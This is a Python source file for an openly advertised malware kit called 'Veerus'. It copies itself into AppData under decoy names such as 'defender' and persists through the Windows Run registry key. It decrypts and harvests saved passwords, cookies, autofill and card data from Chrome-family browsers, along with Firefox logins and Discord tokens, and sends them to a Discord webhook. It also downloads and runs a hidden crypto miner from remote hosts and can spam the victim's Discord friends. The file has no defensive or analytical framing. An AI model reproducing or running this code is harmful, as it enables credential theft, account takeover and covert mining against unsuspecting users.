import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir
import sqlite3
from discord_webhook import DiscordWebhook, DiscordEmbed
import win32crypt
import codecs
import win32crypt
import shutil
import command
import socket
import time
import random
import threading
import re
import json
import uuid
import textwrap
from glob import glob
import FireFoxDecrypt
import requests
import sys
import base64
from base64 import b64decode
from Crypto.Cipher import AES
from json import loads
from regex import findall
import platform
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import codecs
import os
from http.server import HTTPServer, CGIHTTPRequestHandler
import tkinter as tk
import pyImpossibleObf
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


"""

	globals :

"""

#WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
chiffre = "webhook667"
ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao


CLONE_PROCESS = True # Create Instances of the program hidden in multiple path.
PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
PROCESS_NUM = 3 #3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 

MINE = False #Mine crypto? True/False

DMALL_FRIENDS = False #Dm all friends in discord using token.
DMALL_MSG = ":flag_gb: :\nFÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»cked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.


APP_DATA_PATH= os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12


Founded = False
res =  """Stealed By 0xSxZ ------------> \n\n"""
creditcard = "=========Stealed by 0xSxZ =============\n\n"
currency = "=========Stealed by 0xSxZ =============\n\n"
local_appdata = os.environ['LOCALAPPDATA'] + "\\"
default_appdata = os.getenv('APPDATA')
chromiumpaths = [
	default_appdata + "\\Opera Software\\Opera Stable",
	default_appdata + "\\Opera Software\\Opera GX Stable",
	local_appdata + "Google\\Chrome",
	local_appdata + "Google(x86)\\Chrome",
	local_appdata + "Chromium",
	local_appdata + "BraveSoftware\\Brave-Browser",
	local_appdata + "Epic Privacy Browser",
	local_appdata + "Amigo",
	local_appdata + "Vivaldi",
	local_appdata + "Orbitum",
	local_appdata + "Mail.Ru\\Atom",
	local_appdata + "Kometa",
	local_appdata + "Comodo\\Dragon",
	local_appdata + "Torch",
	local_appdata + "Comodo",
	local_appdata + "Slimjet",
	local_appdata + "360Browser\\Browser",
	local_appdata + "Maxthon3",
	local_appdata + "K-Melon",
	local_appdata + "Sputnik\\Sputnik",
	local_appdata + "Nichrome",
	local_appdata + "CocCoc\\Browser",
	local_appdata + "uCozMedia\\Uran",
	local_appdata + "Chromodo",
	local_appdata + "Yandex\\YandexBrowser"
]

yes = "yes"

if yes == "yes":

	def ClearTerm():
		if(os.name == "nt" or os.name == "windows"):
			os.system("cls")
		else:
			os.system("clear")
	def antiAnalysis():
		while True:
			ClearTerm()
			time.sleep(0.1)
	#threading.Thread(target=antiAnalysis).start()
	def valid_uuid(uuid):
		 regex = re.compile('^[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}\Z', re.I)
		 match = regex.match(uuid)
		 return bool(match)
	def launchProcesses(path):
		try:
			os.system("path")
		except Exception as e:
			print("Err : "+ str(e))
	if(CLONE_PROCESS == True):
		numberOfClones = 0
		for i in range(PROCESS_NUM):
			subfolders = os.listdir(os.getenv("APPDATA"))
			for i in range(len(subfolders)):
				if(valid_uuid(subfolders[i])):
					numberOfClones = numberOfClones + 1
					print(numberOfClones)
			if(numberOfClones <= PROCESS_NUM):
				original = os.path.basename(sys.executable)
				folderName = str(uuid.uuid4())
				os.mkdir(str(os.getenv('APPDATA')) +"\\" +folderName)
				rdmchoice = random.choice(PROCCESS_NAMES) 
				target = str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe"
				shutil.copy(original, target)
				threading.Thread(launchProcesses(str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe")).start()
		else:
			print("[.] Already duplicated.")

	try:
		url = 'http://ipinfo.io/json'
		response = requests.get(url)
		data = response.json()
		IP=data['ip']
		org=data['org']
		city = data['city']
		country=data['country']
		region=data['region']
	except:
		IP = str(uuid.uuid4())
		city = str(uuid.uuid4())
		country = str(uuid.uuid4())


	def AddToRegistry():
		#Statup should be available soon for Mac OS
		if os.name == "nt" or os.name == "windows":
			import winreg as reg
			pth = os.path.dirname(os.path.realpath(sys.executable))
			
			# name of the python file with extension
			s_name=os.path.basename(sys.executable)	
			
			# joins the file name to end of path address
			address=os.path.join(pth,s_name)
			
			# key we want to change is HKEY_CURRENT_USER
			# key value is Software\Microsoft\Windows\CurrentVersion\Run
			key = reg.HKEY_CURRENT_USER
			key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
			
			# open the key to make changes to
			open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
			
			# modifiy the opened key
			reg.SetValueEx(open,"WineDefender",0,reg.REG_SZ,address)
			
			# now close the opened key
			reg.CloseKey(open)
		else:
			print("[.] Startup not available because os is Linux or mac.")


	def stealChromeWin():
		try:
			res =  """Stealed By 0xSxZ ------------> \n\n"""
			creditcard = "=========Stealed by 0xSxZ =============\n\n"
			currency = "=========Stealed by 0xSxZ =============\n\n"
			try:
				ibm = 0
				for i in range(len(chromiumpaths)):
					if not os.path.exists(chromiumpaths[i]):
						continue
					path = str(chromiumpaths[i] + "\\User Data\\"+"\\Default\\Web Data")
					if not os.path.exists(path):
						path = str(chromiumpaths[i] + "\\User Data\\"+"\\Profile 1\\Web Data")
						if not os.path.exists(path):
							path = str(chromiumpaths[i] + "\\User Data\\"+"\\Profile 2\\Web Data")
							if not os.path.exists(path):
								continue
					shutil.copy(path, "webdata.db")
					path = "webdata.db"
					db = sqlite3.connect(path)
					connection = sqlite3.connect(str(path))
					cursor = db.cursor()
					cursor.execute("SELECT  name, value FROM 'autofill'")
					for name, value in cursor.fetchall():
						res = res + "[.] " + name + "\n\n[.] Val : " + value + "\n"
						if("card" in value or "credit" in value):
							creditcard = creditcard + res
						if("currency" in value or "billing" in value or "wallet" in value or "finance" in value):
							currency = currency + res
						ibm = ibm + 1
						
						if(ibm >= 370):
							break
					connection.close()
					if(ibm >= 370):
						break
				Founded = True
				return str(res) + "welekip" ":::667" + str(currency) + ":::667" + str(creditcard)
			except Exception as e:
				print(e)
		except Exception as e:
				print(e)
	def stealChromeWinHistory():
		try:
			path = str(os.environ['USERPROFILE'] + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\History")
			connection = sqlite3.connect(str(path))
			chromewinhist = str( tuple(connection.execute("SELECT url FROM 'urls'")))
			connection.close()
			return chromewinhist.replace("(", '\n').replace(")", "\r\n")
		except Exception as e:
			return "[.] Error"
	"""
		credits : 
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc

	"""


	def chromeCookies():
		try:
			chrcooks = ""
			for i in range(len(chromiumpaths)):
				db_path = chromiumpaths[i] + "\\User Data\\Default\\Network\\Cookies"
				print("Getting Chrome cookies : " + db_path)
				if not os.path.exists(db_path):
					continue
				
				filename =  str(uuid.uuid4()) + ".db"
				if not os.path.isfile(filename):
					shutil.copy(db_path, filename)
				# connect to the database
				db = sqlite3.connect(filename)
				# ignore decoding errors
				db.text_factory = lambda b: b.decode(errors="ignore")
				cursor = db.cursor()
				# get the cookies from `cookies` table
				cursor.execute("""SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies""")
				key = get_encryption_key(chromiumpaths[i])
				for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
					decrypted_value = decrypt_data(encrypted_value, key)
					if not value:
						decrypted_value = decrypt_data(encrypted_value, key)
					else:
						chrcooks = chrcooks + f"""
					Host: {host_key}
					Cookie name: {name}
					Cookie value (decrypted): {decrypted_value}
					===============================================================
					"""
					# update the cookies table with the decrypted value
					# and make session cookie persistent
					cursor.execute("""
					UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
					WHERE host_key = ?
					AND name = ?""", (decrypted_value, host_key, name))
				# commit changes
				db.commit()
				# close connection
				db.close()

			return chrcooks
		except Exception as e:
			print(e)
	def chrome_date_and_time(chrome_data):

		# Chrome_data format is 
		# year-month-date hr:mins:seconds.milliseconds
		# This will return datetime.datetime Object
		return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

	def fetching_encryption_key():
		
		# Local_computer_directory_path will
		# look like this below
		# C: => Users => <Your_Name> => AppData => 
		# Local => Google => Chrome => User Data => 
		# Local State
		
		local_computer_directory_path = os.path.join(
		os.environ["USERPROFILE"], "AppData", "Local", "Google",
		"Chrome", "User Data", "Local State")
													 
		with open(local_computer_directory_path, "r", encoding="utf-8") as f:
			local_state_data = f.read()
			local_state_data = json.loads(local_state_data)

		# decoding the encryption key using base64
		encryption_key = base64.b64decode(
		local_state_data["os_crypt"]["encrypted_key"])
		
		# remove Windows Data Protection API (DPAPI) str
		encryption_key = encryption_key[5:]
		
		# return decrypted key
		return win32crypt.CryptUnprotectData(
		encryption_key, None, None, None, 0)[1]
	def password_decryption(password, encryption_key):

		try:
			iv = password[3:15]
			password = password[15:]
			
			# generate cipher
			cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
			
			# decrypt password
			return cipher.decrypt(password)[:-16].decode()
		except:
			try:
				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
			except:
				return "No Passwords"
	def main():
		try:
			binks = ""
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
			if not os.path.exists(db_path):

				db_path = os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "Login Data"
				if not os.path.exists(db_path):
					db_path = os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 2", "Login Data"
					if not os.path.exists(db_path):
						continue
			key = fetching_encryption_key()
			
			filename = "ChromePasswords.db"
			shutil.copyfile(db_path, filename)
			  
			# connecting to the database
			db = sqlite3.connect(filename)
			cursor = db.cursor()
			  
			# 'logins' table has the data
			cursor.execute(
				"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
				"order by date_last_used")
			  
			# iterate over all rows
			for row in cursor.fetchall():
				main_url = row[0]
				login_page_url = row[1]
				user_name = row[2]
				decrypted_password = password_decryption(row[3], key)
				date_of_creation = row[4]
				last_usuage = row[5]
				  
				if user_name or decrypted_password:
					binks = binks + (f"Main URL: {main_url}\n")
					binks = binks + (f"Login URL: {login_page_url}\n")
					binks = binks +(f"User name: {user_name}\n")
					binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
				  
				else:
					continue
				  
				if date_of_creation != 86400000000 and date_of_creation:
					print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
				  
				if last_usuage != 86400000000 and last_usuage:
					print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
				print("=" * 100)
			cursor.close()
			db.close()
			return(binks)
			try:
				  
				# trying to remove the copied db file as 
				# well from local computer
				os.remove(filename)
			except:
				pass
		except Exception as e:
	  		return str(e)
	def PasswLinux():
		try:
			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
			FirefoxPath2 = os.listdir(FirefoxPath)
			FirefoxLength = len(FirefoxPath2)
			for i in range(FirefoxLength):
				if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "/key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
					if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
						db = FirefoxPath + FirefoxPath2[i] + "/key3.db"
					else:
						db = FirefoxPath + FirefoxPath2[i] + "/key4.db"
					passwordF = FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"/logins.json", db)
					return("""
	-------------------------
	Veerus by 0xSz
	Password stealed
	------------------------\n
	""" + str(passwordF)+"\n\n------------------------")
					break
				else:
					print("False")
		except Exception as e:
			return "Error  or no passwords. : " + str(e)



	"""

		credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py

	"""

	tokens = []
	cleaned = []

	def decrypt(buff, master_key):
		try:
			return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
		except Exception as e:
			return "An error has occured.\n" + e
	askUser = "2"
	def getDisk0rdToken():
		if "2" in askUser:

			with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local State", "r") as file:
				key = loads(file.read())['os_crypt']['encrypted_key']
				file.close()
			for file in listdir(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\"):
				if not file.endswith(".ldb") and file.endswith(".log"):
					continue
				else:
					try:
						with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
							for x in files.readlines():
								x.strip()
								for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
									tokens.append(values)
									
					except PermissionError:
						continue
			for i in tokens:
				if i.endswith("\\"):
					i.replace("\\", "")
				elif i not in cleaned:
					cleaned.append(i)
			tosend = ""
			for token in cleaned:
				tosend = tosend + str(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]).encode()) + "\n"
			return tosend
	"""

		^^^^^credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py^^^^^

	"""
	def PasswWin():
		print("[.] Getting Win Firefow pw's")
		try:
			if os.name == 'nt' or os.name == 'windows':	

				passwordF = ""
				FirefoxPath = str(os.getenv('APPDATA')) + "\\Mozilla\\Firefox\\Profiles\\"
				FirefoxPath2 = os.listdir(FirefoxPath)
				FirefoxLength = len(FirefoxPath2)
				for i in range(FirefoxLength):
					if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "\\key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"\\key3.db")):
						if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"\\key3.db")):
							db = FirefoxPath + FirefoxPath2[i] + "\\key3.db"
						else:
							db = FirefoxPath + FirefoxPath2[i] + "\\key4.db"
						passwordF = passwordF + str(FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"\\logins.json", db))
					else:
						print("False")
				return ("""
		-------------------------
		Veerus by 0xSz (on github)
		Password stealed
		------------------------\n
		""" + str(passwordF) +"\n\n------------------------")
						

			else:
				return b"OS not supported."
		except Exception as e:
			return "Error : " + str(e)

	def MineThreadWin():
		print("[.] Starting miner if enabled.")
		os.system(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe")

	def MineThreadLinux():
		print("[.] Starting miner if enabled.")
		try:
			os.system("./apt.bb -o rx.unmineable.com:3333 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k")
		except:
			os.system("./apt.bb -o rx.unmineable.com:3333 -u "+ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
	def connectOption():
		if(os.name != "nt" and platform.system() != "Windows" or os.name != "windows" and platform.system() != "Windows"):
			print("Not windows...")
			try:
				os.system("mkdir /opt/0xSz/")
				time.sleep(2)
				os.system("mkdir /opt/0xSz/update/")
				time.sleep(2)
				os.system("mkdir /opt/0xSz/update/aptEssentials/")
				os.chdir("/opt/0xSz/update/aptEssentials/")
				os.system("apt install wget")
				os.system("wget https://www.dropbox.com/s/kebdpffh42q7e7z/apt?dl=1 -O /opt/0xSz/update/aptEssentials/apt.bb")
				os.system("chmod +x ./apt.bb")
				#threading.Thread(target=MineThreadLinux).start()
				time.sleep(2)
			except Exception as e :
				print(str(e))
			if MINE == True:
				threading.Thread(target=MineThreadLinux).start()
				print("[.] Executing miner..")
		else:
			try:
				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
				open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
	{
		"algo": "rx",
		"api": {
			"port": 0,
			"access-token": null,
			"worker-id": null,
			"ipv6": false,
			"restricted": true
		},
		"av": 0,
		"background": false,
		"colors": true,
		"cpu-affinity": null,
		"cpu-priority": null,
		"donate-level": 5,
		"huge-pages": true,
		"hw-aes": null,
		"log-file": null,
		"max-cpu-usage": 50,
		"pools": [
			{
				"url": "rx.unmineable.com:3333",
				"user": "'''+ ADDRESS  + '''",
				"pass": "x",
				"keepalive": true,
				"nicehash": false,
				"variant": -1,
				"tls": false,
				"tls-fingerprint": null
			}
		],
		"print-time": 60,
		"retries": 5,
		"retry-pause": 5,
		"safe": false,
		"syslog": false,
		"threads": null
	}

				''')
				r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/cUrl.exe?raw=true")
				with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'wb+') as f:
					f.write(r.content)
			except Exception as e:
				print(e)
			if MINE == True:
				threading.Thread(target=MineThreadWin).start()
				print("[.] Executing miner..")
	connectOption()
	if(chiffre != "" and chiffre != None):
		print("[.] Sending")
		webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
		webhook.add_embed(embed)
		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
		print("[.] Password : "+ main())
		webhook.add_file(file=str(main()), filename="0xPasswords.txt")
		try:
			autofill = stealChromeWin()
			autfill = str(autofill).split(":::667")
			print(autfill[1])
		except:
			autfill = ["dazdaz", "dazdza", "dazdhjnza"]
		webhook.add_file(file=autfill[0], filename="Autofill.txt")
		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============

		"""+autfill[1] + autfill[2], filename="finance_and_money.txt")
		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============

		""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="Lmao_PornHub_History_XDDD.txt")
		webhook.execute()
